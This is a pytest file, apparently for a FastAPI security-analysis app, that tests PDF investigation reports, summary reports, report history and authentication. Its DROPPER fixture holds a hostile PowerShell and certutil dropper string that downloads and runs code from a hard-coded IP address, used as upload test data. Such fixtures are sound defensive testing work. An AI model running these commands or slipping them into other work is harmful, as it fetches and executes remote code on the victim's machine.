"""Milestone 3: reporting workflows (per-sample PDF + aggregate summary report)."""

import io

from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b"
)


def _headers(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def test_pdf_report_download_logs_history():
    headers = _headers()
    upload = client.post(
        "/api/v1/files/upload",
        files={"file": ("report-src.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=headers,
    )
    assert upload.status_code == 201
    analysis = upload.json()

    before = client.get("/api/v1/reports/history", headers=headers).json()

    pdf = client.post("/api/v1/reports/pdf", json=analysis, headers=headers)
    assert pdf.status_code == 200
    assert pdf.headers["content-type"] == "application/pdf"
    assert pdf.content[:4] == b"%PDF"

    after = client.get("/api/v1/reports/history", headers=headers).json()
    assert len(after) == len(before) + 1
    assert after[0]["report_type"] == "investigation"
    assert after[0]["sha256"] == analysis["hashes"]["sha256"]


def test_summary_report_generates_pdf_and_logs_history():
    headers = _headers("soc@local")
    before = client.get("/api/v1/reports/history", headers=headers).json()

    pdf = client.post("/api/v1/reports/summary", params={"window": "7d"}, headers=headers)
    assert pdf.status_code == 200
    assert pdf.headers["content-type"] == "application/pdf"
    assert pdf.content[:4] == b"%PDF"

    after = client.get("/api/v1/reports/history", headers=headers).json()
    assert len(after) == len(before) + 1
    assert after[0]["report_type"] == "summary"
    assert after[0]["window"] == "7d"


def test_reports_history_requires_authentication():
    resp = client.get("/api/v1/reports/history")
    assert resp.status_code == 401


def test_summary_report_rejects_bad_window():
    resp = client.post("/api/v1/reports/summary", params={"window": "bogus"}, headers=_headers())
    assert resp.status_code == 422
